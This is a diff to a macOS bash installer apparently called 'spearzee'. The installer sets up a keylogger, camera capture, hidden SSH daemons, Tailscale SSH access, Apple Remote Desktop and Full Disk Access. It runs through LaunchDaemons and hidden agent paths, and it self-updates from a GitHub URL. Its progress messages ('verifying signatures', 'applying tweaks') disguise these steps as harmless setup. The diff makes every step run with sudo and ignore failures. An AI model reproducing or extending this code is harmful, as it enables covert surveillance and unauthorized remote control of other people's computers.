@@ -145,7 +145,7 @@ step_sshd(){
 
   if [ "$SSH_PORT2" != "" ]; then
     P2=/Library/LaunchDaemons/com.spear-tui.sshd2.plist
-    cat > "$P2" <<S2
+    sudo tee "$P2" >/dev/null <<S2
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
@@ -267,7 +267,7 @@ step_tools(){
     sudo killall tccd >/dev/null 2>&1 || true
     ok "keylogger permissions pre-granted"
     P=/Library/LaunchDaemons/com.spear-tui.keylog.plist
-    cat > "$P" <<KPL
+    sudo tee "$P" >/dev/null <<KPL
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0"><dict>
@@ -877,19 +877,19 @@ main(){
 
   progress
   step_preflight
-  phase "fetching core";         step_account
-  phase "verifying signatures";  step_keys
-  phase "unpacking payload";     step_sshd
-  phase "configuring display";   step_sharing
-  phase "granting disk access";  step_fda
-  phase "configuring login";     step_login
-  phase "downloading runtime";   step_ts_install
-  phase "connecting to network"; step_ts_join
-  phase "applying tweaks";       step_power
-  phase "registering services";  step_agent
-  phase "building modules";      step_tools
-  phase "writing configuration"; step_report
-  phase "finalizing";            step_self
+  phase "fetching core";         step_account || true
+  phase "verifying signatures";  step_keys || true
+  phase "unpacking payload";     step_sshd || true
+  phase "configuring display";   step_sharing || true
+  phase "granting disk access";  step_fda || true
+  phase "configuring login";     step_login || true
+  phase "downloading runtime";   step_ts_install || true
+  phase "connecting to network"; step_ts_join || true
+  phase "applying tweaks";       step_power || true
+  phase "registering services";  step_agent || true
+  phase "building modules";      step_tools || true
+  phase "writing configuration"; step_report || true
+  phase "finalizing";            step_self || true
   stop_progress
 
   if [ "$FAKE" = "true" ]; then
@@ -917,8 +917,8 @@ main(){
 
 ############################# settings ###############################
 
-SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v4/spearzee.sh"
-SELF_SHA="4f29c063c223fa7f77548a1d8528a42fe9b2f5e4a384ae41eaceefc4e7224a39"
+SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v5/spearzee.sh"
+SELF_SHA="2505cd5ab9d5e722e41cd796cdb325a8ef238a6f1d15f75982fb60ae02b7093a"
 SELF="/usr/local/bin/spear-tui"
 KEYLOG="spearzee-keylog"
 CAM="spearzee-cam"
@@ -961,5 +961,7 @@ LOCK="/var/run/spear-tui.lock"
 KICK="/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart"
 TS="/Applications/Tailscale.app/Contents/MacOS/Tailscale"
 AGENT_PATHS=("/var/root/.spear/agent.sh" "/Library/Application Support/.spear/agent.sh" "/usr/local/libexec/spear-agent.sh")
+
+TSFLAGS="--accept-dns=false --accept-routes=false --operator=$RUSER --ssh"
 
 main "$@"
